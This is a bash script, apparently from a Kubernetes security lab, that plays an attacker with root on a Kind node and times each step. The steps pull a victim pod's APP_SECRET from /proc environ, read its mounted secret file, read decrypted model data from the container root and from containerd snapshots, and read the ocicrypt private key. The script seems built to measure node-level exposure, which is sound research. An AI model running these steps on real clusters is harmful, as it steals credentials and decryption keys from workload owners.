#!/usr/bin/env bash
# Attacker with root on supply-worker (docker exec into the Kind node is the
# same as a root shell on a real node). Each step is timed and its output saved.
set -uo pipefail
source "$(dirname "$0")/lib.sh"
OUT="$LAB/results/node-root"; mkdir -p "$OUT"
N=supply-worker
kubectl apply -f "$LAB/manifests/victim.yaml" >/dev/null
kubectl -n enc wait --for=condition=Ready pod/victim --timeout=120s >/dev/null
echo -e "step\tms\tlast-line-of-output" > "$OUT/steps.tsv"
step() { # step NAME 'shell run as root inside the node'
  local name=$1; shift; local t0 t1 out
  t0=$(date +%s%N); out=$(docker exec "$N" sh -c "$*" 2>&1); t1=$(date +%s%N)
  printf '$ %s\n%s\n' "$*" "$out" > "$OUT/$name.txt"
  printf '%s\t%s\t%s\n' "$name" "$(( (t1-t0)/1000000 ))" "$(echo "$out" | tail -1 | cut -c1-120)" | tee -a "$OUT/steps.tsv"
}

CID='$(crictl ps -q --label io.kubernetes.pod.name=victim --name app)'
PID="\$(crictl inspect --output go-template --template '{{.info.pid}}' $CID)"
step 01-find-process "echo pid=$PID"
step 02-env "tr '\\0' '\\n' < /proc/$PID/environ | grep APP_SECRET"
step 03-secret-volume "cat /proc/$PID/root/var/run/creds/password; echo; ls -d /var/lib/kubelet/pods/*/volumes/kubernetes.io~secret/creds; df -h /var/lib/kubelet/pods/*/volumes/kubernetes.io~secret/creds | tail -1"
step 04-decrypted-rootfs "head -c 31 /proc/$PID/root/opt/model/model.bin; echo"
SNAP=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots
step 05-snapshot-on-disk "for f in $SNAP/*/fs/opt/model/model.bin; do echo \$f; head -c 31 \$f; echo; done"
step 06-steal-key "ls -l /etc/containerd/ocicrypt/keys; head -1 /etc/containerd/ocicrypt/keys/enc-priv.pem"
